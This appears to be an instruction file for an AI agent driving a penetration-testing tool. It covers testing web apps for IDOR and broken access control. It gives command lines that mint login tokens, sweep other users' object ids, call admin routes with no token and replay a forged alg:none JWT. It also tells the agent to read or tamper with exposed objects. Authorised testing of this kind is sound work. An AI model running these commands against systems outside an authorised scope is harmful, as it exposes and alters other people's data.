---
model: haiku
---

# authz — test broken access control / IDOR (T1190, CWE-639/862)

Prove a resource is served to someone who should not have it: another user's object by id, an
admin-only route with a non-admin (or forged) token, or a call with no token at all. Exploitation
tier — the ROE must allow-list T1190 and name an authoriser. Get tokens from `searu loot --reveal`
(a login, a cracked credential, a jwt forgery). Have no token yet? **Mint one first** by POSTing the
login with `fetch` — `searu run fetch --technique T1083 --target http://host:port/rest/user/login --
--method POST --header 'Content-Type: application/json' --data '{"email":"<u>","password":"<p>"}'` — it
lands in loot as category `session-token`.

Run — assert the request *should* be denied, and supply the identity to test after `--`. For
**authenticated object-level IDOR**, carry *your own* JWT and sweep the neighbouring ids with a `{id}`
placeholder + `--range`; a served id that is not yours is the bug:

    searu run authz --technique T1190 --target 'http://host:port/rest/basket/{id}' -- --should-deny \
      --range 1-20 --header 'Authorization: Bearer <your-own-JWT>'
    searu run authz --technique T1190 --target 'http://host:port/api/Cards/{id}' -- --should-deny \
      --range 1-20 --header 'Authorization: Bearer <your-own-JWT>'
    searu run authz --technique T1190 --target http://host:port/rest/admin -- --should-deny   # unauthenticated
    searu run authz --technique T1190 --target http://host:port/rest/user/whoami -- --should-deny \
      --header 'Authorization: Bearer <forged-alg:none-token>'                                 # JWT bypass

Read results:

    searu findings --tool authz        # one confirmed broken-access-control finding per served id/url
    searu observations --kind replay   # the status/length of every replay, denied or not

A denial (401/403) is the app behaving — no finding, move on. A 2xx/3xx on a should-deny request is the
bug: read or tamper each exposed object (`--method PUT --data ...`), then sweep the neighbouring routes
the same way. A forged token that is accepted confirms the JWT-signature bypass. Don't paste raw bodies.
See `searu tool advice authz`.
